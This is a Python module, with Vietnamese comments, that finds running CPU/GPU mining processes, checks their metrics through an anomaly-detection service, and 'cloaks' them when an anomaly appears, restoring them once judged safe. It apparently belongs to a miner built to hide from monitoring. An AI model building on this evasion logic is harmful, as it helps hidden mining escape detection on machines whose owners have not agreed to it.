# anomaly_detector.py

import psutil
import logging
import traceback
import asyncio
import pynvml
from asyncio import Event
from typing import List, Dict, Any
from contextvars import ContextVar

from .utils import MiningProcess
from .anomaly_evaluator import SafeRestoreEvaluator  # Chỉ import, không định nghĩa lại

from .auxiliary_modules.models import ConfigModel
from .auxiliary_modules.event_bus import EventBus
from .auxiliary_modules.interfaces import IResourceManager

###############################################################################
#   QUẢN LÝ NVML TOÀN CỤC CHO MODULE                                          #
###############################################################################
_nvml_lock = asyncio.Lock()
_nvml_initialized = False  # Phải khai báo toàn cục

async def initialize_nvml():
    global _nvml_initialized
    async with _nvml_lock:
        if not _nvml_initialized:
            try:
                pynvml.nvmlInit()
                _nvml_initialized = True
            except pynvml.NVMLError as e:
                raise RuntimeError(f"Lỗi khi khởi tạo NVML: {e}") from e

def is_nvml_initialized() -> bool:
    return _nvml_initialized

###############################################################################
#                           LỚP CHÍNH: AnomalyDetector                        #
###############################################################################

class AnomalyDetector:
    """
    Lớp phát hiện bất thường cho tiến trình khai thác, event-driven.
    """

    _instance = None
    _instance_lock = asyncio.Lock()

    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
        if not hasattr(cls, '_instance') or cls._instance is None:
            cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
        if getattr(self, '_initialized', False):
            return

        self._initialized = True
        self.config = config
        self.event_bus = event_bus
        self.logger = logger
        self.resource_manager = resource_manager

        self.stop_event = asyncio.Event()
        self.mining_processes = []
        self.mining_processes_lock = asyncio.Lock()

        # SafeRestoreEvaluator là 1 logic tùy biến, ta giả sử có
        self.safe_restore_evaluator = SafeRestoreEvaluator(config, logger, resource_manager)

        self.task_futures = []
        self.logger.info("AnomalyDetector đã được khởi tạo thành công.")

    async def start(self):
        """
        Khởi động AnomalyDetector.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")

        if not self.resource_manager:
            raise RuntimeError("ResourceManager chưa được thiết lập.")

        # Đảm bảo NVML đã khởi tạo
        if not is_nvml_initialized():
            await initialize_nvml()
            self.logger.info("NVML đã được khởi tạo (một lần).")

        # Khởi động SafeRestoreEvaluator
        try:
            await self.safe_restore_evaluator.start()  # Đảm bảo start() là async
        except Exception as e:
            self.logger.error(f"Lỗi khi khởi động SafeRestoreEvaluator: {e}\n{traceback.format_exc()}")

        # Tạo các coroutine background
        loop = asyncio.get_event_loop()
        self.task_futures.append(loop.create_task(self.anomaly_detection()))
        self.task_futures.append(loop.create_task(self.monitor_restoration()))

        # Khởi chạy discovery ban đầu
        await self.discover_mining_processes_async()
        self.logger.info("AnomalyDetector đã khởi động thành công.")

    async def discover_mining_processes_async(self):
        """
        Tìm các tiến trình khai thác, tùy theo config (CPU, GPU).
        """
        cpu_name = self.config.processes.get('CPU', '').lower()
        gpu_name = self.config.processes.get('GPU', '').lower()

        retry_attempts = 3
        for attempt in range(retry_attempts):
            try:
                async with self.mining_processes_lock:
                    self.mining_processes.clear()
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            pname = proc.info['name'].lower()
                            if cpu_name in pname or gpu_name in pname:
                                prio = self.get_process_priority(proc.info['name'])
                                net_if = self.config.network_interface
                                mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
                                mining_proc.is_cloaked = False
                                self.mining_processes.append(mining_proc)
                        except Exception as e:
                            self.logger.error(f"Lỗi khi xử lý tiến trình {proc.info['name']}: {e}")
                    if not self.mining_processes:
                        self.logger.warning("Không phát hiện tiến trình khai thác nào.")
                    else:
                        self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")
                    return

            except Exception as e:
                self.logger.error(f"Lỗi discover_mining_processes_async (attempt {attempt+1}): {e}")
                if attempt == retry_attempts - 1:
                    raise e
                await asyncio.sleep(1)

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên (priority) dựa trên config.
        """
        priority_map = self.config.process_priority_map
        val = priority_map.get(process_name.lower(), 1)
        if not isinstance(val, int):
            self.logger.warning(f"Độ ưu tiên '{process_name}' không phải int => gán = 1.")
            return 1
        return val

    ##########################################################################
    #                           PHÁT HIỆN BẤT THƯỜNG                          #
    ##########################################################################
    async def anomaly_detection(self):
        """
        Coroutine chính để phát hiện bất thường.
        """
        while not self.stop_event.is_set():
            try:
                await self.discover_mining_processes_async()
                async with self.mining_processes_lock:
                    tasks = [self.evaluate_process_anomaly(proc) for proc in self.mining_processes]
                if tasks:
                    await asyncio.gather(*tasks)
                else:
                    self.logger.info("Không có tiến trình để kiểm tra bất thường.")
            except asyncio.CancelledError:
                self.logger.info("Anomaly detection coroutine bị hủy.")
                break
            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")

            # Interval giám sát
            interval = self.config.monitoring_parameters.get("detection_interval_seconds", 3600)
            await asyncio.sleep(interval)

    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int = 5):
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID={process.pid} không tồn tại.")
                return

            # Lấy metric "thô" cho 1 PID =>  { 'cpu_usage':..., 'gpu_usage':..., ... }
            current_metrics = await self.resource_manager.collect_metrics(process)
            if not current_metrics:
                self.logger.warning(f"Không thu thập được metrics PID={process.pid}. Bỏ qua.")
                return

            # ==== QUAN TRỌNG: Đóng gói metrics thành {"<pid>": {...}} ====
            # Vì detect_anomalies() (nếu dùng logic cũ) duyệt theo pid => 
            # Tránh việc pid= 'cpu_usage_percent'
            single_proc_data = {
                str(process.pid): current_metrics
            }

            # Gọi Anomaly Detector (Azure) => True/False hoặc dict
            # Mặc định ta demo logic bool, 
            # Hoặc logic cũ: detect_anomalies(single_proc_data) trả về dict pid-> [metric...]
            anomalies = await self.resource_manager.azure_anomaly_detector_client.detect_anomalies(single_proc_data)

            # GIẢ ĐỊNH detect_anomalies() trả về bool => is_anomaly
            # Hoặc trả về dict => ta check key str(process.pid)  
            if isinstance(anomalies, bool):
                is_anomaly = anomalies
            elif isinstance(anomalies, dict):
                # cũ: anomalies = { 'pid': [list_metrics], ...}
                is_anomaly = (str(process.pid) in anomalies and anomalies[str(process.pid)])
            else:
                is_anomaly = False

            if is_anomaly:
                self.logger.warning(
                    f"Phát hiện bất thường {process.name} (PID={process.pid}), cloak sau {cloak_delay}s."
                )
                await asyncio.sleep(cloak_delay)
                await self.enqueue_cloaking(process)
                process.is_cloaked = True
            else:
                self.logger.info(f"Không phát hiện bất thường cho PID={process.pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        try:
            await self.resource_manager.enqueue_cloaking(process)
            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        try:
            await self.resource_manager.enqueue_restoration(process)
            self.logger.info(f"Đã enqueue restore cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                    GIÁM SÁT ĐIỀU KIỆN PHỤC HỒI TÀI NGUYÊN              #
    ##########################################################################
    async def monitor_restoration(self):
        interval = 60
        while not self.stop_event.is_set():
            try:
                async with self.mining_processes_lock:
                    cloaked_procs = [p for p in self.mining_processes if getattr(p, 'is_cloaked', False)]

                if self.safe_restore_evaluator and cloaked_procs:
                    tasks = [self.safe_restore_evaluator.is_safe_to_restore(p) for p in cloaked_procs]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    for proc, result in zip(cloaked_procs, results):
                        if isinstance(result, Exception):
                            self.logger.error(f"Lỗi khi kiểm tra khôi phục PID={proc.pid}: {result}")
                            continue

                        if result:
                            self.logger.info(f"Đủ điều kiện khôi phục PID={proc.pid}.")
                            await self.enqueue_restoration(proc)
                            proc.is_cloaked = False
                            self.logger.info(f"Đã khôi phục tài nguyên cho {proc.name} (PID={proc.pid}).")
                        else:
                            self.logger.info(f"PID={proc.pid} chưa đủ điều kiện để khôi phục.")
            except Exception as e:
                self.logger.error(f"Lỗi monitor_restoration: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(interval)

    async def stop(self):
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()

        for task in self.task_futures:
            task.cancel()

        await asyncio.gather(*self.task_futures, return_exceptions=True)
        self.logger.info("AnomalyDetector đã dừng thành công.")
